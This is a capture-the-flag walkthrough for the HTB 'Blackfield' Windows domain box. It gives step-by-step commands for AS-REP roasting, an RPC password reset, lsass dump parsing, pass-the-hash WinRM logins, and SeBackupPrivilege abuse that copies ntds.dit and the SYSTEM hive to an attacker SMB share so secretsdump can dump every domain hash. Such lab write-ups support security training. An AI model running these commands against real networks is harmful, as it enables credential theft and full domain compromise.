# BLACKFIELD

## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Hard](Hard)
- Platform: [HTB](HTB)
- **Exploits Used:**  
  - AS‑REP Roasting (no‑preauth users)  
  - RPC password reset via `setuserinfo2`  
  - Memory dump analysis with **pypykatz** (lsass.exe)  
  - **SeBackupPrivilege** → VSS snapshot via **diskshadow**  
  - **secretsdump.py** on `ntds.dit` + `SYSTEM` hive  
  - EFS nuance & session‑based decryption  

---

## TLDR 🚀
1. **AS‑REP roast** `support@BLACKFIELD.local` → crack `#00^BlackKnight`  
2. **SMB** as **support** (read‑only)  
3. **BloodHound** → discover `ForceChangePassword` on **audit2020**  
4. **RPC** (`setuserinfo2`) → reset **audit2020** → SMB access  
5. **Forensic** share → memory dumps → **pypykatz** → svc_backup NT hash  
6. **WinRM** as **svc_backup**  
7. **SeBackupPrivilege** → VSS mount with **diskshadow** → pull `ntds.dit` + `SYSTEM`  
8. **secretsdump.py** → dump all domain hashes → WinRM as **Administrator**  
9. **EFS**: need a process in Session 1 to decrypt `root.txt`  

---

## Tools 🛠️
- **nmap** – port & service discovery  
- **GetNPUsers.py** – AS‑REP roasting  
- **hashcat** (`-m 18200`) – crack Kerberoast/AS‑REP hashes  
- **crackmapexec**, **rpcclient** – SMB auth & RPC password resets  
- **ldapsearch**, **bloodhound-python** – AD enumeration & ACL analysis  
- **smbmap**, **smbclient** – share browsing & file pulls  
- **pypykatz** – dump creds from `lsass.DMP`  
- **evil-winrm** – interactive WinRM shell  
- **SeBackupPrivilegeCmdLets** – copy locked files as Backup Operator  
- **diskshadow** – create & expose VSS snapshot  
- **secretsdump.py** – extract domain NTLM hashes from `ntds.dit` + `SYSTEM`  
- **cipher**, **Meterpreter** – EFS insights & session migration  

---

## Commands to Solve Box 📝

```bash
# 1. AS‑REP roast “support” (no-preauth)
GetNPUsers.py -no-pass -dc-ip 10.10.10.192 BLACKFIELD.local/support \
  | grep krb5asrep > asrep.hash

hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt --force
# => support:#00^BlackKnight

# 2. SMB as support
crackmapexec smb 10.10.10.192 -u support -p '#00^BlackKnight'

# 3. BloodHound collect & find ForceChangePassword on audit2020
bloodhound-python -c ALL -u support -p '#00^BlackKnight' \
  -d BLACKFIELD.local -dc dc01.BLACKFIELD.local -ns 10.10.10.192

# 4. RPC reset audit2020’s password
rpcclient -U "BLACKFIELD.local/support%#00^BlackKnight" 10.10.10.192 \
  -c 'setuserinfo2 audit2020 23 "0xdf!!!"'

# 5. SMB as audit2020 → enumerate shares
crackmapexec smb 10.10.10.192 -u audit2020 -p '0xdf!!!'

# 6. Enter forensic share → grab lsass dump
smbclient -U audit2020//0xdf!!! //10.10.10.192/forensic
get memory_analysis/lsass.zip
unzip lsass.zip

# 7. pypykatz on lsass.DMP → extract svc_backup NT hash
pypykatz lsa minidump lsass.DMP

# 8. WinRM as svc_backup
evil-winrm -i 10.10.10.192 -u svc_backup \
  -H 9658d1d1dcd9250115e2205d9f48400d

# 9. Abuse Backup Privilege → VSS mount (diskshadow script vss.dsh)
#    Create vss.dsh with Windows CRLF:
#      set context persistent nowriters
#      set metadata c:\programdata\df.cab
#      set verbose on
#      add volume c: alias df
#      create
#      expose %df% z:
evil-winrm> Upload vss.dsh & diskshadow /s c:\programdata\vss.dsh

# 10. SMB server on attacker (smbserver.py s . -smb2support -username df -password df)
evil-winrm> Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.14.14\s\ntds.dit
evil-winrm> reg.exe save hklm\system \\10.10.14.14\system

# 11. Dump full domain hashes
secretsdump.py -system system -ntds ntds.dit LOCAL

# 12. WinRM as Administrator
evil-winrm -i 10.10.10.192 -u Administrator \
  -H 184fb5e5178480be64824d4cd53b99ee
```

---

## Actions Learned 💡
- **AS‑REP roasting** for preauth‑not‑required accounts.  
- **RPC password reset** via `setuserinfo2` on AD.  
- **Memory dump analysis** (`pypykatz`) on `lsass.exe`.  
- **SeBackupPrivilege** abuse with VSS (`diskshadow`) to read locked system files.  
- **NTDS secretsdump** to harvest every domain hash.  
- **EFS protection** requires a process in the console session to decrypt.  

---

## References 📚
- AS‑REP Roasting & Kerberos:  
  – https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py  
- RPC Password Reset Trick:  
  – https://mubix.ca/past/hacking/ad-password-reset-via-rpc/  
- pypykatz MiniDump extraction:  
  – https://github.com/skelsec/pypykatz  
- VSS & diskshadow for backups:  
  – https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow  
- secretsdump & SeBackupPrivilege:  
  – https://github.com/SecureAuthCorp/impacket/wiki/Secretsdump  